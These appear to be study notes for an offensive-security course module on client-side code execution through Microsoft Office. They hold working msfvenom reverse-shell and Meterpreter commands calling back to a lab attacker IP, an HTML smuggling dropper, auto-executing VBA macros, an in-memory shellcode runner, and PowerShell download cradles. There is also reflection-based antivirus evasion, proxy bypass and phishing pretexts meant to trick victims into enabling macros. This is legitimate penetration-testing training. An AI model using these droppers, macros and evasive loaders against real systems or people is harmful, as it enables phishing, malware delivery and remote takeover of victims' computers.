PEN-300 Module 3 — Client-Side Code Execution with Office: droppers, HTML smuggling, and VBA macros

Fuente: material del curso correspondiente (sin video público)

Objective

Two ways to gain unauthorized remote access: exploit a vulnerable internet-facing service (no victim interaction, but the target must run vulnerable software), or trick a user into running malicious code. User behavior is much harder to patch than software, which makes the second vector the primary focus of this module: gain code execution by abusing Microsoft Office, the suite users commonly use and trust (a 2018 Cisco report attributed 38% of all email phishing attacks to Office).

The module builds the full client-side ladder:

  1. Droppers & payloads — staged vs non-staged Metasploit payloads, msfvenom generation, Netcat and multi/handler catchers.
  2. HTML smuggling — browser-side automatic dropper delivery via the HTML5 anchor download attribute, Blobs, and object URLs.
  3. VBA macros — macro basics, auto-execution traps (Document_Open/AutoOpen), Trust Center and Protected View, and launching processes from Word.

Lab IPs used throughout (verbatim from the course): attacker 192.168.119.120, Windows 10 victim 192.168.120.11. No credentials appear in this module.

Techniques

1. Will you be my dropper

Real-world scenario: a Trojan (script or document) is delivered to the victim and tricked into execution. Traditional trojans embed the entire payload; more complex dropper trojans use a staged payload with a callback function that connects back to the attack machine to download the second stage. The delivered code may be written to disk or run directly from memory; its objective is a communication channel back to the attacker. Names for the code running on the victim: implant, agent, backdoor, malware.

That code must reach C2 infrastructure, carrying the attacker's hostname/domain or IP over a protocol such as HTTP/HTTPS (may simulate user activity) or DNS (simulates common network activity). In this module the C2 is simply the attack machine itself; Metasploit streamlines the process.

2. Staged vs non-staged payloads

  • Non-staged, e.g. windows/shell_reverse_tcp: self-contained assembly that calls Windows APIs to connect back and expose cmd.exe.
  • Staged, e.g. windows/shell/reverse_tcp: minimal first stage performs the callback, retrieves the remaining code, executes it in memory — smaller memory footprint, may evade antivirus.

Delimiter convention: non-staged uses _ in the name, staged uses / (the payload description also states it):

windows/x64/meterpreter_reverse_https    Connect back to attacker and spawn a Meterpreter shell
windows/x64/meterpreter/reverse_https    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged x64).

3. Building the droppers

Non-staged executable, saved to the Apache web root, plus a Netcat catcher:

sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=444 -f exe -o /var/www/html/shell.exe
sudo service apache2 start
sudo nc -lnvp 444

Victim-side: browse to the payload URL in Edge, download, execute, accept warnings → reverse shell from 192.168.120.11 in the listener.

Staged Meterpreter comparison (same construction, protocol from the payload suffix, LPORT 443 = typical HTTPS port):

sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfnonstaged.exe
# Payload size: 207449 bytes / Final size of exe file: 214016 bytes
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
# Payload size: 694 bytes / Final size of exe file: 7168 bytes

The non-staged payload is nearly thirty times larger — significantly more detection surface for endpoint security. Staged payloads require the multi/handler module, which listens for callbacks and delivers the second stage:

sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 192.168.119.120
set lport 443
exploit

Running msfstaged.exe on the victim: a ~7 KB callback executes, then 207,449 bytes are staged in memory and a Meterpreter session opens (192.168.119.120:443 -> 192.168.120.11:49678).

4. HTML smuggling

Manual download-and-run works for a demo; real attackers embed a link in an email so that JavaScript automatically saves the dropper when the victim visits the page. The technique leverages the HTML5 anchor tag download attribute, which instructs the browser to automatically download a file when the hyperlink is clicked.

Simplest form (exposes filename/extension, needs a click):

<html><body>
  <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
</body></html>

Fully automatic version — three steps, all in memory:

  1. Store the payload in a JavaScript Blob ({type: 'octet/stream'}) — the download attribute also accepts an embedded Blob, not just server files.
  2. Create a URL file object with window.URL.createObjectURL(blob) — simulates a file on the web server but reads from memory.
  3. Create an invisible anchor (display: none), set href to the object URL, set download to the on-disk filename, and call a.click().

The binary itself is Base64-encoded and decoded back into a byte array client-side:

function base64ToArrayBuffer(base64) {
  var binary_string = window.atob(base64);
  var len = binary_string.length;
  var bytes = new Uint8Array(len);
  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
  return bytes.buffer;
}

Generate and encode the payload (strip line breaks — embed as one continuous string, or wrap each line in quotes):

sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
base64 /var/www/html/msfstaged.exe

Complete smuggling page (listing 15 in the course): base64ToArrayBuffer(file) → new Blob([data], {type: 'octet/stream'}) → hidden anchor with a.download = fileName → a.click() → window.URL.revokeObjectURL(url).

Behavior and caveats:

  • Browsing the page in Google Chrome triggers the download with no user interaction (Chrome supports window.URL.createObjectURL; IE/Edge need modification — exercise: use window.navigator.msSaveBlob).
  • The saved executable is marked as browser-originated, so SmartScreen blocks execution: click More info → Run anyway.
  • Running it yields a Meterpreter session via multi/handler (session 2 in the course walkthrough).
  • The filename was set to msfstaged.exe; a warning may appear because the attachment is an executable — a limitation the later module sections (Office documents) sidestep.

5. Phishing with Microsoft Office (module intro)

Office comes in two variants — Office 365 (continuously updated, online storage) and standalone versions like Office 2016. Its ubiquity makes it a prime phishing target because victims trust it. The attack vector explored from here: VBA, the embedded programming language.

Lab prep: install Office 2016 on the Windows 10 victim VM from C:\installs\Office2016.img (mounted as a virtual CD, run Setup.exe, accept the license agreement on the 7-day trial).

6. Introduction to VBA

Workflow: in Word, View → Macros, select the current document from the dropdown (e.g. "Document1 (document)") so the VBA embeds in this document only — otherwise it is saved to the global template. Name the macro (e.g. MyMacro) → Create opens the VBA editor.

Language basics:

  • Sub MyMacro() ... End Sub defines a method (cannot return values); Function ... End Function can.
  • Variables declared with Dim name As type — String (unicode string), Long (64-bit integer), LongPtr (memory pointer); these map to the OS native types used in C/C++.
  • Flow: If ... Then ... Else ... End If branching; For counter = 1 To 3 ... Next counter loops (increment at Next).
  • Run with the Run Macro button or F5.

Auto-execution traps — the victim will not run the macro willingly, so leverage the document-open hooks:

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()

Continuing the listing:

    MsgBox ("This is a macro test")
End Sub

Both hooks are used for redundancy (Document_Open is called Workbook_Open in Excel). The document must be saved in a macro-enabled format — .doc (Word 97-2003) or .docm; the newer .docx does not store macros.

Office security (File → Options → Trust Center → Trust Center Settings):

  • Default macro setting: "Disable all macros with notification" — reopening the saved document shows a security warning banner instead of executing; Enable Content runs it. The attack must therefore persuade the victim to both open the document and enable macros.
  • Protected View (since Office 2010): sandbox for documents originating from the Internet — macros disabled, external images blocked, extra warning shown. The attack must also trick the user out of Protected View (addressed later in the course).

Launching processes from VBA — two equivalents, both hidden:

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide                    ' VBA Shell function; vbHide = 0
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0    ' Windows Script Host
End Sub

Verification: Process Explorer (SysInternals, C:\Tools) shows cmd.exe as a child process of WINWORD.EXE. Note the security warning only reappears when the document is renamed — per-document macro enablement persists.

Exercises (as given in the course)

  • Repeat the HTML smuggling to trigger a download of a Meterpreter payload in a file format of your choosing; modify the smuggling code to also use window.navigator.msSaveBlob so the technique works with Microsoft Edge.
  • Install Microsoft Office on your Windows 10 client VM.

7. Let PowerShell help us (download cradles in VBA)

VBA is compiled and typed; PowerShell compiles and executes on the fly through the .NET framework, is generally untyped, and more flexible. Syntax notes: variables via $, comparisons use -eq/-ne instead of ==/!=. Because PowerShell reaches .NET, it makes ideal download cradles. Most use HTTP/HTTPS, but a cradle over DNS TXT records is possible (later in the course).

$out = "msfstaged.exe"

$wc.DownloadFile($url, $out)

(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')

Embedded in VBA: Shell launches PowerShell with the cradle as the argument, hidden (vbHide). Downloaded content lands in the document's current folder, so the executable path is built from ActiveDocument.Path. 8. Keeping up appearances — pretexting and the old switcheroo

Client-side phishing requires deceiving the victim, often multiple times: open the file, enable macros, browse to a URL — all without alerting them. A pretext is a false motive used in a social engineering attack. Phishing exploits curiosity or fear; common ruses: job applications, healthcare contract updates, invoices, HR requests. The classic Office pattern — present a document, claim it's encrypted/protected, ask the user to Enable Editing and Enable Content — is used in the wild by Quasar RAT and the Ursnif Trojan.

Legitimacy cues: no spelling/grammar mistakes, content matching the ruse, trusted product names/logos (Microsoft, RSA), encryption-standard talk. The course example: a job-application document "encrypted per GDPR regulations" with random Base64 text and an RSA logo, targeted at an HR analyst opening.

The switcheroo keeps the deception going after Enable Content: the victim expects "decrypted" content, so show it — and keep the document open long enough for the shell.

  1. Copy the document, delete the placeholder text, create the fake CV.
  2. Select the CV text → Insert > Quick Parts > AutoTexts > Save Selection to AutoText Gallery; name it TheDoc. Delete it from the body; paste the fake RSA-encrypted blob into the body.
  3. VBA swaps the blob for the CV: select the whole ActiveDocument.Content range, Selection.Delete, then insert from the AutoText gallery:
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub

Sub SubstitutePage()

Same listing, continued:

    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
End Sub

The victim sees the "decrypted" CV and believes the document behaved exactly as promised — this pretext has repeatedly tricked victims into disabling both Protected View and macro security.

9. Executing shellcode in Word memory — why and which APIs

Downloading an executable has two drawbacks: it may be flagged by network monitoring, and it lands on disk where antivirus can scan it. The upgrade: execute the staged Meterpreter payload directly in memory. Pure VBA can't do this (the payload is raw assembly), but VBA can call native Win32 APIs in DLLs (unmanaged code) via the Declare keyword — Private Declare keeps the import local to our code.

Mapping C types to VBA (poorly documented; MSDN has partial comparisons): - LPSTR (pointer to string) → VBA String passed ByVal (a VBA String already holds the pointer). - LPDWORD (pointer to DWORD) → VBA Long passed ByRef (ByRef yields the pointer). - BOOL return → Long.

Warm-up (Listings 33–36) — GetUserNameA from Advapi32.dll, then trim the fixed 256-byte buffer at its null terminator:

  Dim MySize As Long
  Dim strlen As Long
  MySize = 256

10. The VBA shellcode runner (VirtualAlloc → RtlMoveMemory → CreateThread)

The classic three-API runner, all from Kernel32.dll:

  1. VirtualAlloc — allocate RWX memory (other allocation APIs return non-executable memory because of DEP).
  2. RtlMoveMemory — copy the shellcode into it byte by byte.
  3. CreateThread — start a new execution thread at the buffer.

Declarations (Listings 38, 42, 45):

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Shellcode generation — note the architecture reasoning: target is 64-bit Windows, but Word 2016 installs 32-bit by default, so generate 32-bit shellcode in vbapplication format, with EXITFUNC=thread so an exiting shellcode doesn't kill Word:

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
# Payload size: 575 bytes / Final size of vbapplication file: 1972 bytes
# buf = Array(<first payload bytes>)

Runner body (Listings 40, 43, 46):

Dim buf As Variant
Dim addr As LongPtr
Dim res As Long
Dim counter As Long
Dim data As Long

buf = Array(<msfvenom -f vbapplication output>) ' 575-byte payload

With the 575 bytes staged in buf, the runner body allocates executable memory and copies the payload in:

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)  ' MEM_COMMIT|MEM_RESERVE, RWX

' copy buf into addr byte-by-byte with RtlMoveMemory (Listing 43, loop elided),
' then hand addr to CreateThread (Listing 46)

Details that matter: - lpAddress = 0 lets the OS pick the address; dwSize is computed dynamically with UBound(buf) so payload swaps need no edits. - &H3000 = MEM_COMMIT | MEM_RESERVE; &H40 = readable, writable, executable. - RtlMoveMemory's sSource is declared Any and passed ByRef (address of the array element); destination is already a pointer, length is 1 byte per iteration. - CreateThread mostly takes zeros — only lpStartAddress (the shellcode buffer) matters.

Feeding this through the same macro scaffolding (auto-open traps + shellcode in buf) gives a Word document that executes Meterpreter entirely in memory.

11. Finish the VBA runner, then its weaknesses

Full runner (Listing 47) = declarations + buf array + VirtualAlloc(0, UBound(buf), &H3000, &H40) + copy loop + CreateThread(0,0,addr,0,0,0) inside MyMacro, wired to both auto-open traps. The shell calls back entirely in memory — the matching multi/handler must be 32-bit with EXITFUNC=thread.

Trade-off: low profile (no executable on disk), but the shell dies when Word closes. Metasploit's AutoMigrate solves this; this module explores an alternative.

Two remaining weaknesses drive the rest of the module: 1. The document embeds the staged shellcode on disk where AV may scan it. 2. If the victim closes Word, the in-memory shell dies with it.

Fix: move the shellcode out of the document into a PowerShell script on the web server, and run PowerShell as a child process of Word — by default the child survives Word's exit.

12. PowerShell shellcode runner (P/Invoke + Add-Type)

PowerShell can't natively call Win32 APIs, but .NET lets us use C# in the PowerShell session via DllImportAttribute (unmanaged DLL invocation) with C-type→C# translations from P/Invoke (pinvoke.net is the standard reference). Namespaces System and System.Runtime.InteropServices come in through using.

Warm-up (MessageBox):

$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text,
        String caption, int options);
}

Continuing the listing:

"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)

Notes: @"..."@ declares a Here-String (text block); Add-Type forces .NET to compile the C# code into an object we can call. Word 2016 is 32-bit, so PowerShell spawned from it is 32-bit too — test from the 32-bit ISE: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe.

...

The [uint32] cast is required because PowerShell only uses signed integers. Result: PowerShell lingers as a child of WINWORD.EXE and the shell survives — payload no longer in the document, execution appears fully in memory.

13. PowerShell leaves disk artifacts — the Add-Type compilation problem

"Runs in memory" is not literally true: Add-Type compiles through the Visual C# Command-Line Compiler (csc), which temporarily writes both the .cs source and the compiled .dll assembly to disk. Demonstration with Process Monitor (SysInternals; note: not Process Explorer):

  • Filter → file writes by powershell_ise.exe, apply, clear events with Ctrl+X (the course writes C+x).
  • Running the MessageBox code produces CreateFile/WriteFile/CloseFile events on randomly-named files like rtylilrr.0.cs and rtylilrr.dll.

Confirm the assembly is loaded into the process:

[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname

→ rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null appears among loaded assemblies. Endpoint AV can flag exactly these artifacts, so the runner must be rebuilt to avoid Add-Type altogether.

14. Dynamic lookup — reusing UnsafeNativeMethods

Alternative to DllImport: dynamic lookup, the low-level C way. Two OS APIs find function addresses without compiling anything:

  • GetModuleHandle — handle (memory address) of a DLL.
  • GetProcAddress — function address given DLL handle + name.

Both must be invoked from already-loaded assemblies (creating a new assembly is exactly what we're avoiding). Hunting them with the course's assembly sweep (Listing 72) — piping [AppDomain]::CurrentDomain.GetAssemblies() through Get-Member -Static and filtering on TypeName.Contains('Unsafe') — turns up Microsoft.Win32.UnsafeNativeMethods.

Output includes Microsoft.Win32.UnsafeNativeMethods exposing both GetModuleHandle and GetProcAddress (plus GetModuleFileName, event-log APIs, etc.). Locate the owning assembly by printing $_.Location and matching TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods'):

C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll

→ System.dll — a fundamental .NET library that is always loaded in PowerShell. We can therefore call GetModuleHandle/GetProcAddress through [Microsoft.Win32.UnsafeNativeMethods] without ever touching csc.

15. The catch — UnsafeNativeMethods internals, and reflection

Problem: GetModuleHandle/GetProcAddress in Microsoft.Win32.UnsafeNativeMethods are internal — .NET blocks direct calls from PowerShell/C#. The way in is Reflection: dynamically obtain references to objects that are otherwise private or internal.

Two steps (Listings 76/77, folded into the resolver below): (1) grab the System.dll assembly from the loaded-appdomain list filtered on the GAC flag and filename tail, then GetType('Microsoft.Win32.UnsafeNativeMethods'); (2) GetMethod('GetModuleHandle') on that object and call its Invoke — $null as the instance (static method) plus an argument array.

Wrapped into a reusable resolver (Listing 78):

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

This resolves any Win32 API without Add-Type — no compilation, no disk writes.

16. DelegateType reflection — pairing an address with a prototype

A resolved address needs a function prototype (argument types + return type). C# uses GetDelegateForFunctionPointer(address, delegateType); PowerShell has no delegate keyword, so build the delegate manually in memory via reflection (per Microsoft's 2004 technique):

  1. New-Object System.Reflection.AssemblyName('ReflectedDelegate') — a custom in-memory assembly.
  2. $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) — Run access mode = executable, not saved to disk.
  3. .DefineDynamicModule('InMemoryModule', $false) — no symbol info.
  4. .DefineType('MyDelegateType', <class flags>,[System.MulticastDelegate]) — a sealed, public, AutoClass subclass of MulticastDelegate so it can be instantiated and called.
  5. .DefineConstructor('RTSpecialName, HideBySig, Public', …, @(<argument types>)) then .SetImplementationFlags('Runtime, Managed') — the constructor's last argument is the function prototype.
  6. .DefineMethod('Invoke', <method flags>, <return type>, @(<argument types>)) + implementation flags again — NewSlot/Virtual ensure a fresh vtable slot.
  7. .CreateType() → pass to [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer.

Full proof-of-concept (Listing 88) — resolve MessageBoxA via LookupFunc, build the delegate, invoke:

$MyFunction = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)

Verification: Process Monitor shows no .cs source and no compilation on disk.

17. The PowerShell reflection shellcode runner

Package the delegate construction into getDelegateType (Listing 89) — it takes the API's argument types as a [Type[]] array plus the return type (default [Void]), chains steps 1–7 above verbatim (assembly → module → type → constructor → Invoke), and returns $type.CreateType().

Condensed one-line calls embed LookupFunc + getDelegateType inside GetDelegateForFunctionPointer. Full runner (Listing 93/94) — remember the 32-bit shellcode because PowerShell is a 32-bit child of Word:

Deployment trick: the Word macro only runs the DownloadString | IEX cradle pointing at run.ps1, so overwriting the file on the Apache web server upgrades the payload with no document change — open the doc, get a reverse HTTPS shell from an all-in-memory PowerShell (Listing 95: [*] Started HTTPS reverse handler on https://192.168.119.120:443 ... request from 192.168.120.11).

18. Talking to the proxy — PowerShell cradles vs Meterpreter

Enterprises force traffic through proxies for monitoring; testers must make techniques work through the proxy or (situation permitting) bypass it. Meterpreter HTTP/HTTPS payloads are already proxy-aware; the PowerShell download cradles are the open question. Lab setup: Squid proxy on the Windows 10 development client 192.168.120.12, TCP 3128 (Settings → Network & Internet → Proxy → Manual proxy setup); victim client is 192.168.120.11.

Default behaviour — proxy-aware. Net.WebClient is proxy-aware today (not always true historically; may revert in future Windows). Its settings live in the .proxy property, populated from DefaultWebProxy at object creation; inspect with GetProxy:

[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
# AbsoluteUri : http://192.168.120.12:3128/   <- request will leave from the proxy

Apache access log confirms the request arrives from 192.168.120.12 (the proxy), not the victim. Bypass — null the proxy:

$wc = new-object system.net.WebClient
$wc.proxy = $null
$wc.DownloadString("http://192.168.119.120/run.ps1")

→ log now shows the request from 192.168.120.11 directly. Caveat: in some environments non-proxied traffic is blocked at the edge firewall — bypassing the proxy can also mean losing connectivity.

19. Fiddling with the User-Agent

Net.WebClient sets no default User-Agent, which stands out in proxy/web logs. Customize via the Headers property:

$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")

The string lands in the Apache access log ("GET /run.ps1 HTTP/1.1" 304 182 "-" "This is my agent..."). Obviously better: emulate a real browser's User-Agent (Google Chrome / Internet Explorer) instead.

20. Give me a SYSTEM proxy — resolving a user proxy as SYSTEM

Side-effect of privilege escalation: a SYSTEM-integrity PowerShell cradle has no proxy configuration and may fail to call back. Demonstrate from a SYSTEM 32-bit ISE (C:\Tools\Sysinternals> PsExec.exe -s -i C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe): with the proxy still enabled, the basic cradle's request arrives directly from the victim (192.168.120.11), bypassing the proxy.

Per-user proxy settings live in the registry at HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\InternetSettings (ProxyServer key). As SYSTEM there is no HKCU hive mapped — but HKEY_USERS always exists, split by user SID. Map it, pick the first real user (SIDs starting S-1-5-21- exclude built-in/service accounts), strip the leading HKEY_USERS\ (10 chars), read ProxyServer, and assign a WebProxy object:

New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")

Gotchas from the walkthrough: - Fetch the shellcode runner as run2.ps1 — PowerShell may cache the previously fetched file and skew results. - The HKU: mapping persists across reruns of the code — close the PowerShell ISE prompt for the full script to run if earlier incremental steps already mapped it.

Result: the request now routes through the proxy from 192.168.120.12 ("GET /run2.ps1 HTTP/1.1" 304 182 "-" "-") — the cradle calls back to C2 even when all traffic must traverse the proxy.

Wrap-up

Client-side execution exploits user behavior, not software bugs; success depends on a convincing pretext. The tradecraft ladder built here:

  • Droppers (staged vs non-staged, msfvenom + multi/handler/Netcat) → HTML smuggling for automatic in-browser delivery.
  • VBA: auto-open traps + Win32 via Declare → in-memory shellcode runner (VirtualAlloc/RtlMoveMemory/CreateThread) whose weakness is that it dies with Word.
  • PowerShell: Add-Type P/Invoke runner (works, but csc writes .cs/.dll to disk) → full reflection runner reusing Microsoft.Win32.UnsafeNativeMethods in System.dll with in-memory delegate types — no disk artifacts at all — delivered by a DownloadString | IEX cradle, upgradable server-side without touching the document.
  • Network hygiene: Net.WebClient proxy awareness/bypass, custom User-Agent, and SYSTEM-context proxy resolution from HKEY_USERS.

Gaining an initial shell on a client is the crucial first step; later modules cover additional techniques for it.
